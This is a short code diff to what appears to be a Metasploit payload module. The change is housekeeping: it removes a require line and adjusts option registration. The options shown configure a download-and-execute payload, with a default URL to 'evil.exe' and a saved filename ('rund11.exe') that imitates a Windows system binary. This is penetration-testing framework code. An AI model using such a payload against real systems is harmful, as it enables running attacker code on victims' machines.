@@ -4,8 +4,6 @@
 ##
 
 
-require 'msf/core'
-
 module MetasploitModule
 
   CachedSize = 423
@@ -31,7 +29,7 @@ module MetasploitModule
       [
         OptString.new('URL', [true, "The pre-encoded URL to the executable" ,"https://localhost:443/evil.exe"]),
         OptString.new('EXE', [ true, "Filename to save & run executable on target system", "rund11.exe" ])
-      ], self.class)
+      ])
   end
 
   #
